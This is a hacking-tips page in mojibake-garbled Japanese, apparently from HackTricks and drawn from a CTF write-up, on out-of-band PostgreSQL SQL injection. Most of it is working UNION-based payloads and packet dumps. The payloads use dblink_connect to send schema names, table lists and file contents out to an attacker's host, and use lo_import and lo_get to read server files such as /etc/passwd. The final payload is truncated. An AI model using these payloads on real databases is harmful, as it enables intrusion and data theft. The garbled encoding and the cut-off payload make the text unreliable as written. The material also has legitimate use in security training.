# dblink/lo\_importãƒ‡ãƒ¼ã‚¿ã®æ¼æ´©

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€ç§ãŸã¡ã®ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³

- [**å…¬å¼ã®PEASSï¼†HackTricks swag**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

**ã“ã‚Œã¯ã€`lo_import`ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã€`dblink_connect`ã‚’ä½¿ç”¨ã—ã¦ãã‚Œã‚‰ã‚’æ¼æ´©ã•ã›ã‚‹æ–¹æ³•ã®ä¾‹ã§ã™ã€‚**

## æ¼æ´©ã‚µãƒ¼ãƒãƒ¼/éåŒæœŸSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®æº–å‚™

**æŠ½å‡ºå…ƒ:** [**https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md**](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

`pg_sleep`ã‚‚é…å»¶ã‚’å¼•ãèµ·ã“ã•ãªã„ãŸã‚ã€ã‚¯ã‚¨ãƒªã®å®Ÿè¡ŒãŒãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ã¾ãŸã¯éåŒæœŸã§è¡Œã‚ã‚Œã‚‹ã¨å®‰å…¨ã«æ¨å®šã§ãã¾ã™ã€‚

é€šå¸¸ã€`dblink_connect`ã¯ãƒªãƒ¢ãƒ¼ãƒˆã®PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ°¸ç¶šçš„ãªæ¥ç¶šã‚’é–‹ããŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ï¼ˆä¾‹ï¼š`SELECT dblink_connect('host=HOST user=USER password=PASSWORD dbname=DBNAME')`ï¼‰ã€‚ã“ã®é–¢æ•°ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’åˆ¶å¾¡ã§ãã‚‹ãŸã‚ã€SQL Server Side Request Forgeryã‚’è‡ªåˆ†è‡ªèº«ã®ãƒ›ã‚¹ãƒˆã«å¯¾ã—ã¦å®Ÿè¡Œã§ãã¾ã™ã€‚ã¤ã¾ã‚Šã€SQLã‚¯ã‚¨ãƒªã®çµæœã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã«Out-of-Band SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚å°‘ãªãã¨ã‚‚ã€æ¬¡ã®2ã¤ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

1. **DNSã‚µãƒ¼ãƒãƒ¼**ã‚’è¨­å®šã—ã€`[data].our.domain`ã¸ã®æ¥ç¶šã‚’ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ã§ã€ãƒ­ã‚°ã‚„DNSãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‘ã‚±ãƒƒãƒˆã§ãƒ‡ãƒ¼ã‚¿ã‚’è¡¨ç¤ºã§ãã¾ã™ã€‚
2. **ãƒ‘ãƒ–ãƒªãƒƒã‚¯ãªPostgreSQLã‚µãƒ¼ãƒãƒ¼ã‚’è¨­å®šã—ã€PostgreSQLãƒãƒ¼ãƒˆã¸ã®ç€ä¿¡ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‘ã‚±ãƒƒãƒˆã‚’ç›£è¦–**ã—ã€æ¼æ´©ã—ãŸãƒ‡ãƒ¼ã‚¿ã‚’`user`/`dbname`ã¨ã—ã¦ãƒ›ã‚¹ãƒˆã¸ã®æ¥ç¶šã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯**ã€PostgreSQLã¯é€šä¿¡ã«SSLã‚’ä½¿ç”¨ã—ãªã„ãŸã‚ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä¸Šã§`user`/`dbname`ã‚’**å¹³æ–‡**ã§è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**2ç•ªç›®ã®æ–¹æ³•ã®æ–¹ãŒç°¡å˜**ã§ã™ã€‚ãƒ‰ãƒ¡ã‚¤ãƒ³ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚ãƒ‘ãƒ–ãƒªãƒƒã‚¯IPã‚’æŒã¤ã‚µãƒ¼ãƒãƒ¼ã‚’è¨­å®šã—ã€PostgreSQLã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã€PostgreSQLã‚µãƒ¼ãƒ“ã‚¹ã‚’\*/0.0.0.0ã§ãƒªãƒƒã‚¹ãƒ³ã™ã‚‹ã‚ˆã†ã«è¨­å®šã—ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ€ãƒ³ãƒ‘ãƒ¼ï¼ˆä¾‹ï¼štcpdumpï¼‰ã‚’å®Ÿè¡Œã—ã¦PostgreSQLãƒãƒ¼ãƒˆï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§5432ï¼‰ã¸ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ç›£è¦–ã™ã‚‹ã ã‘ã§ã™ã€‚

PostgreSQLã‚’**ãƒ‘ãƒ–ãƒªãƒƒã‚¯ã«ãƒªãƒƒã‚¹ãƒ³**ã™ã‚‹ã«ã¯ã€`postgresql.conf`ã®`listen_addresses`ã‚’`*`ã«è¨­å®šã—ã¾ã™ã€‚
```
listen_addresses = '*'
```
å…¥åŠ›ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’ç›£è¦–ã™ã‚‹ãŸã‚ã«ã€ãƒãƒ¼ãƒˆ5432ã‚’ç›£è¦–ã™ã‚‹ãŸã‚ã«`tcpdump`ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
```
sudo tcpdump -nX -i eth0 port 5432
```
ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‹ã‚‰ã®æ¥ç¶šã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®ã‚¯ã‚¨ãƒªã‚’è©¦ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=farisv password=postgres dbname=hellofromfb')) --
```
æˆåŠŸã™ã‚Œã°ã€èª­ã¿å–ã‚Šå¯èƒ½ãª `user` ã¨ `dbname` ã‚’æŒã¤ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ‘ã‚±ãƒƒãƒˆã®ä¸€éƒ¨ã‚’å–å¾—ã—ã¾ã™ã€‚
```
17:14:11.267060 IP [54.185.163.254.50968] > [REDACTED]: Flags [P.], seq 1:43, ack 1, win 229, options [nop,nop,TS val 970078525 ecr 958693110], length 42
0x0000:  4500 005e 9417 4000 2706 248c 36b9 a3fe  E..^..@.'.$.6...
0x0010:  9de6 2259 c718 2061 5889 142a 9f8a cb5d  .."Y...aX..*...]
0x0020:  8018 00e5 1701 0000 0101 080a 39d2 393d  ............9.9=
0x0030:  3924 7ef6 0000 002a 0003 0000 7573 6572  9$~....*....user
0x0040:  0066 6172 6973 7600 6461 7461 6261 7365  .farisv.database
0x0050:  0068 656c 6c6f 6672 6f6d 6662 0000       .hellofromfb.
```
æ¬¡ã«ã€ã„ãã¤ã‹ã®PostgreSQLã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’æŠ½å‡ºã—ç¶šã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ç©ºç™½ã‚’å«ã‚€ã‚¯ã‚¨ãƒªçµæœã«å¯¾ã—ã¦ã¯ã€`encode`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦çµæœã‚’**hex/base64**ã«å¤‰æ›ã™ã‚‹ã‹ã€`replace`é–¢æ•°ã‚’ä½¿ç”¨ã—ã¦ç©ºç™½ã‚’ä»–ã®æ–‡å­—ã«ç½®ãæ›ãˆã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ãªãœãªã‚‰ã€ã“ã‚Œã‚‰ã®å‡¦ç†ä¸­ã«`dblink_connect`ãƒ—ãƒ­ã‚»ã‚¹ã§å®Ÿè¡Œã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã‹ã‚‰ã§ã™ã€‚

**ã‚¹ã‚­ãƒ¼ãƒã®ãƒªã‚¹ãƒˆ**ã‚’å–å¾—ã—ã¾ã™ï¼š
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
```

```
17:36:46.538178 IP 54.185.163.254.51018 > [REDACTED]: Flags [P.], seq 1:70, ack 1, win 229, options [nop,nop,TS val 971433789 ecr 960048322], length 69
0x0000:  4500 0079 ecd5 4000 2706 cbb2 36b9 a3fe  E..y..@.'...6...
0x0010:  9de6 2259 c74a 2061 1e74 4769 b404 803d  .."Y.J.a.tGi...=
0x0020:  8018 00e5 2710 0000 0101 080a 39e6 e73d  ....'.......9..=
0x0030:  3939 2cc2 0000 0045 0003 0000 7573 6572  99,....E....user
0x0040:  0070 7562 6c69 633a 696e 666f 726d 6174  .public:informat
0x0050:  696f 6e5f 7363 6865 6d61 3a70 675f 6361  ion_schema:pg_ca
0x0060:  7461 6c6f 6700 6461 7461 6261 7365 0070  talog.database.p
0x0070:  6f73 7467 7265 7300 00                   ostgres.
```
ç¾åœ¨ã®ã‚¹ã‚­ãƒ¼ãƒã®ãƒ†ãƒ¼ãƒ–ãƒ«ã®ä¸€è¦§ã‚’å–å¾—ã—ã¾ã™ï¼š
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(tablename, ':') FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || ' password=postgres dbname=postgres')) --
```

```
17:38:30.515438 IP 54.185.163.254.51026 > [REDACTED]: Flags [P.], seq 1:42, ack 1, win 229, options [nop,nop,TS val 971537775 ecr 960152304], length 41
0x0000:  4500 005d f371 4000 2706 c532 36b9 a3fe  E..].q@.'..26...
0x0010:  9de6 2259 c752 2061 8dd4 e226 24a3 a5c5  .."Y.R.a...&$...
0x0020:  8018 00e5 fe2b 0000 0101 080a 39e8 7d6f  .....+......9.}o
0x0030:  393a c2f0 0000 0029 0003 0000 7573 6572  9:.....)....user
0x0040:  0073 6561 7263 6865 7300 6461 7461 6261  .searches.databa
0x0050:  7365 0070 6f73 7467 7265 7300 00         se.postgres.
```
**searches** ãƒ†ãƒ¼ãƒ–ãƒ«ã® **è¡Œæ•°** ã‚’ **ã‚«ã‚¦ãƒ³ãƒˆ** ã—ã¾ã™ã€‚
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT COUNT(*) FROM searches) || ' password=postgres dbname=postgres')) --
```

```
17:42:39.511643 IP 54.185.163.254.51034 > [REDACTED]: Flags [P.], seq 1:35, ack 1, win 229, options [nop,nop,TS val 971786760 ecr 960401280], length 34
0x0000:  4500 0056 7982 4000 2706 3f29 36b9 a3fe  E..Vy.@.'.?)6...
0x0010:  9de6 2259 c75a 2061 5ec0 7df0 8611 357d  .."Y.Z.a^.}...5}
0x0020:  8018 00e5 f855 0000 0101 080a 39ec 4a08  .....U......9.J.
0x0030:  393e 8f80 0000 0022 0003 0000 7573 6572  9>....."....user
0x0040:  0030 0064 6174 6162 6173 6500 706f 7374  .0.database.post
0x0050:  6772 6573 0000                           gres.
```
ç¾åœ¨ã®ã‚¹ã‚­ãƒ¼ãƒã«ã¯ç©ºã®ãƒ†ãƒ¼ãƒ–ãƒ«ãŒ1ã¤ã—ã‹ãªãã€ãƒ•ãƒ©ã‚°ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã‚ã‚Šã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€`/var/lib/postgresql/data/secret`ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚æ®‹å¿µãªãŒã‚‰ã€`pg_read_file`ã‚„`pg_read_binary_file`ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚ã†ã¨ã™ã‚‹ã¨ã€å—ä¿¡æ¥ç¶šãŒãªã„ãŸã‚ã€ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã“ã‚Œã‚‰ã®é–¢æ•°ã‚’ä½¿ç”¨ã™ã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

#### postdresqlã‚’ä½¿ç”¨ã—ãŸéåŒæœŸSQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®è©³ç´°æƒ…å ±

* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

## **å¤§ããªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å†…å®¹ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™**

å¤§ããªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ[https://www.postgresql.org/docs/11/lo-funcs.html](https://www.postgresql.org/docs/11/lo-funcs.html)ï¼‰ã€‚`lo_import`ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’`pg_largeobject`ã‚«ã‚¿ãƒ­ã‚°ã«ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã‚¯ã‚¨ãƒªãŒæˆåŠŸã—ãŸå ´åˆã€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®`oid`ã‚’å–å¾—ã—ã¾ã™ã€‚
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
```

```
17:54:51.963925 IP 54.185.163.254.51046 > [REDACTED]: Flags [P.], seq 1:39, ack 1, win 229, options [nop,nop,TS val 972519214 ecr 961133706], length 38
0x0000:  4500 005a 071f 4000 2706 b188 36b9 a3fe  E..Z..@.'...6...
0x0010:  9de6 2259 c766 2061 26fb c8a7 bbb3 fe01  .."Y.f.a&.......
0x0020:  8018 00e5 2272 0000 0101 080a 39f7 772e  ...."r......9.w.
0x0030:  3949 bc8a 0000 0026 0003 0000 7573 6572  9I.....&....user
0x0040:  0032 3436 3638 0064 6174 6162 6173 6500  .24668.database.
0x0050:  706f 7374 6772 6573 0000                 postgres..
```
`oid`ã¨ã—ã¦24668ã‚’å–å¾—ã—ãŸã®ã§ã€`lo_import`é–¢æ•°ã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚æ®‹å¿µãªãŒã‚‰ã€`lo_get(24668)`ã‚’ä½¿ç”¨ã—ã¦å¤§ããªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å†…å®¹ã‚’å–å¾—ã—ã‚ˆã†ã¨ã—ã¦ã‚‚ã€ã¾ãŸã¯`pg_largeobject`ã‚«ã‚¿ãƒ­ã‚°ã«ç›´æ¥ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã—ã¦ã‚‚ã€çµæœã¯å¾—ã‚‰ã‚Œã¾ã›ã‚“ã€‚**ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã¯æ–°ã—ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å†…å®¹ã‚’èª­ã¿å–ã‚‹æ¨©é™ãŒãªã„ã‚ˆã†ã§ã™ã€‚**

PostgreSQLã®å¤§ããªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª­ã‚“ã å¾Œã€**å¤§ããªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«ã¯ACLï¼ˆã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ãƒªã‚¹ãƒˆï¼‰ãŒå­˜åœ¨ã™ã‚‹**ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã¤ã¾ã‚Šã€ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒèª­ã¿å–ã‚Šã‚’è¨±å¯ã•ã‚Œã¦ã„ã‚‹ACLã‚’æŒã¤å¤ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚ã‚Œã°ã€ãã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å†…å®¹ã‚’å¤–éƒ¨ã«æ¼æ´©ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

`pg_largeobject_metadata`ã‹ã‚‰åˆ©ç”¨å¯èƒ½ãªå¤§ããªã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®`oid`ã®ãƒªã‚¹ãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(cast(l.oid as text), ':') FROM pg_largeobject_metadata l) || ' password=postgres dbname=postgres')) --
```

```
18:06:57.172285 IP 54.185.163.254.51052 > [REDACTED]: Flags [.], seq 1:2897, ack 1, win 229, options [nop,nop,TS val 973244413 ecr 961858878], length 2896
0x0000:  4500 0b84 7adf 4000 2606 339e 36b9 a3fe  E...z.@.&.3.6...
0x0010:  9de6 2259 c76c 2061 8d76 e934 10c9 3972  .."Y.l.a.v.4..9r
0x0020:  8010 00e5 a66d 0000 0101 080a 3a02 87fd  .....m......:...
0x0030:  3954 cd3e 0000 1c94 0003 0000 7573 6572  9T.>........user
0x0040:  0031 3635 3731 3a31 3634 3339 3a31 3635  .16571:16439:165
0x0050:  3732 3a31 3634 3431 3a31 3634 3432 3a31  72:16441:16442:1
0x0060:  3733 3732 3a31 3634 3434 3a31 3634 3435  7372:16444:16445
0x0070:  3a31 3831 3534 3a31 3733 3830 3a31 3737  :18154:17380:177
0x0080:  3038 3a31 3635 3737 3a31 3634 3530 3a31  08:16577:16450:1
0x0090:  3634 3531 3a31 3634 3532 3a31 3634 3533  6451:16452:16453

.....
.....
.....
```
ç§ãŸã¡ã¯ã„ãã¤ã‹ã®`oid`ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ãŸã€‚ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®å†…å®¹ã‚’èª­ã¿è¾¼ã‚€ãŸã‚ã«`lo_get`ã‚’ä½¿ç”¨ã—ã¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€`lo_get(16439)`ã¯`/etc/passwd`ã®å†…å®¹ã‚’èª­ã¿è¾¼ã¿ã¾ã™ã€‚`lo_gets`ã®çµæœã¯`bytea`ãªã®ã§ã€ã‚¯ã‚¨ãƒªã«è¿½åŠ ã™ã‚‹ãŸã‚ã«`UTF8`ã«å¤‰æ›ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãƒ•ãƒ©ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ãŒä»¥å‰ã«èª­ã¿è¾¼ã¾ã‚ŒãŸã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€æœ€ã‚‚ä½ã„`oid`ã‚’æŒã¤ã„ãã¤ã‹ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’èª­ã¿è¾¼ã‚“ã§ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ•ãƒ©ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯`oid` 16444ã§å­˜åœ¨ã—ã¾ã™ã€‚ãƒ•ãƒ©ã‚°ã«ã¯ç©ºç™½ãŒãªã„ã®ã§ã€ãã®ã¾ã¾è¡¨ç¤ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ãƒ•ãƒ©ã‚°ã‚’èª­ã¿è¾¼ã‚€ãŸã‚ã«ã¯:
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=postgres dbname=p
```
#### oidã®è©³ç´°æƒ…å ±ï¼š

* [https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module](https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module)
* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚

- [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚

- [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**

- **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
